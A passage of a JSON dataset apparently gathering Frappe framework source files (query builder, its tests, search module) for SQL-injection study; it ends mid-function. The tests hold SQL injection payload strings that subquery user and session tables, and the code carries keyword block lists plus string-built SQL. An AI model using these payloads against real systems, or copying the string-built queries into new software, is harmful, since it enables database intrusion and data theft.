\"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\t\tregex = re.compile('^.*[,();].*')\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif regex.match(field):\n\t\t\t\tif any(keyword in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() \\\n\t\t\t\t\tfor keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/tests/test_db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\nfrom __future__ import unicode_literals\n\nimport frappe, unittest\n\nfrom frappe.model.db_query import DatabaseQuery\nfrom frappe.desk.reportview import get_filters_cond\n\nclass TestReportview(unittest.TestCase):\n\tdef test_basic(self):\n\t\tself.assertTrue({\"name\":\"DocType\"} in DatabaseQuery(\"DocType\").execute(limit_page_length=None))\n\n\tdef test_fields(self):\n\t\tself.assertTrue({\"name\":\"DocType\", \"issingle\":0} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\"], limit_page_length=None))\n\n\tdef test_filters_1(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[[\"DocType\", \"name\", \"like\", \"J%\"]]))\n\n\tdef test_filters_2(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[{\"name\": [\"like\", \"J%\"]}]))\n\n\tdef test_filters_3(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"like\", \"J%\"]}))\n\n\tdef test_filters_4(self):\n\t\tself.assertTrue({\"name\":\"DocField\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": \"DocField\"}))\n\n\tdef test_in_not_in_filters(self):\n\t\tself.assertFalse(DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", None]}))\n\t\tself.assertTrue({\"name\":\"DocType\"} \\\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", None]}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertTrue(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", 'DocType,DocField']}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertFalse(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", 'DocType,DocField']}))\n\n\tdef test_or_filters(self):\n\t\tdata = DatabaseQuery(\"DocField\").execute(\n\t\t\t\tfilters={\"parent\": \"DocType\"}, fields=[\"fieldname\", \"fieldtype\"],\n\t\t\t\tor_filters=[{\"fieldtype\":\"Table\"}, {\"fieldtype\":\"Select\"}])\n\n\t\tself.assertTrue({\"fieldtype\":\"Table\", \"fieldname\":\"fields\"} in data)\n\t\tself.assertTrue({\"fieldtype\":\"Select\", \"fieldname\":\"document_type\"} in data)\n\t\tself.assertFalse({\"fieldtype\":\"Check\", \"fieldname\":\"issingle\"} in data)\n\n\tdef test_between_filters(self):\n\t\t\"\"\" test case to check between filter for date fields \"\"\"\n\t\tfrappe.db.sql(\"delete from tabEvent\")\n\n\t\t# create events to test the between operator filter\n\t\ttodays_event = create_event()\n\t\tevent1 = create_event(starts_on=\"2016-07-05 23:59:59\")\n\t\tevent2 = create_event(starts_on=\"2016-07-06 00:00:00\")\n\t\tevent3 = create_event(starts_on=\"2016-07-07 23:59:59\")\n\t\tevent4 = create_event(starts_on=\"2016-07-08 00:00:01\")\n\n\t\t# if the values are not passed in filters then event should be filter as current datetime\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", None]}, fields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\n\t\t# if both from and to_date values are passed\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-06\", \"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event2.name } in data)\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event4.name } not in data)\n\n\t\t# if only one value is passed in the filter\n\t\tdata = DatabaseQuery(\"Event\").execute(\n\t\t\tfilters={\"starts_on\": [\"between\", [\"2016-07-07\"]]},\n\t\t\tfields=[\"name\"])\n\n\t\tself.assertTrue({ \"name\": event3.name } in data)\n\t\tself.assertTrue({ \"name\": event4.name } in data)\n\t\tself.assertTrue({ \"name\": todays_event.name } in data)\n\t\tself.assertTrue({ \"name\": event1.name } not in data)\n\t\tself.assertTrue({ \"name\": event2.name } not in data)\n\n\tdef test_ignore_permissions_for_get_filters_cond(self):\n\t\tfrappe.set_user('test1@example.com')\n\t\tself.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])\n\t\tself.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))\n\t\tfrappe.set_user('Administrator')\n\n\tdef test_query_fields_sanitizer(self):\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\t\tfields=[\"name\", \"issingle, version()\"], limit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (select name from tabUser), count(name))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, (select count(*) from tabSessions)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tself.assertRaises(frappe.DataError, DatabaseQuery(\"DocType\").execute,\n\t\t\tfields=[\"name\", \"issingle, IF(issingle=1, (SELECT name from tabUser), count(*))\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"count(name)\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('count(name)' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"locate('', name) as _relevance\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('_relevance' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\", \"date(creation) as creation\"],\n\t\t\tlimit_start=0, limit_page_length=1)\n\t\tself.assertTrue('creation' in data[0])\n\n\t\tdata = DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\",\n\t\t\t\"datediff(modified, creation) as date_diff\"], limit_start=0, limit_page_length=1)\n\t\tself.assertTrue('date_diff' in data[0])\n\ndef create_event(subject=\"_Test Event\", starts_on=None):\n\t\"\"\" create a test event \"\"\"\n\n\tfrom frappe.utils import get_datetime\n\n\tevent = frappe.get_doc({\n\t\t\"doctype\": \"Event\",\n\t\t\"subject\": subject,\n\t\t\"event_type\": \"Public\",\n\t\t\"starts_on\": get_datetime(starts_on),\n\t}).insert(ignore_permissions=True)\n\n\treturn event",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/8ad60a25b9d382c2b0ee7c78f1dd118e2d18066b",
        "file_path": "/frappe/desk/search.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\n# Search\nfrom __future__ import unicode_literals\nimport frappe, json\nfrom frappe.utils import cstr, unique\nfrom frappe import _\nfrom six import string_types\n\n\ndef sanitize_searchfield(searchfield):\n\tblacklisted_keywords = ['select', 'delete', 'drop', 'update', 'case', 'and', 'or', 'like']\n\n\tdef _raise_exception():\n\t\tfrappe.throw(_('Invalid Search Field'), frappe.DataError)\n\n\tif len(searchfield) >= 3:\n\n\t\t# to avoid 1=1\n\t\tif '=' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# in mysql -- is used for commenting the query\n\t\telif ' --' in searchfield:\n\t\t\t_raise_exception()\n\n\t\t# to avoid and, or and like\n\t\telif any(' {0} '.format(keyword) in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n\t\t# to avoid select, delete, drop, update and case\n\t\telif any(keyword in searchfield.split() for keyword in blacklisted_keywords):\n\t\t\t_raise_exception()\n\n# this is called by the Link Field\n@frappe.whitelist()\ndef search_link(doctype, txt, query=None, filters=None, page_length=20, searchfield=None):\n\tsearch_widget(doctype, txt, query, searchfield=searchfield, page_length=page_length, filters=filters)\n\tfrappe.response['results'] = build_for_autosuggest(frappe.response[\"values\"])\n\tdel frappe.response[\"values\"]\n\n# this is called by the search box\n@frappe.whitelist()\ndef search_widget(doctype, txt, query=None, searchfield=None, start=0,\n\tpage_length=10, filters=None, filter_fields=None, as_dict=False):\n\tif isinstance(filters, string_types):\n\t\tfilters = json.loads(filters)\n\n\tmeta = frappe.get_meta(doctype)\n\n\tif 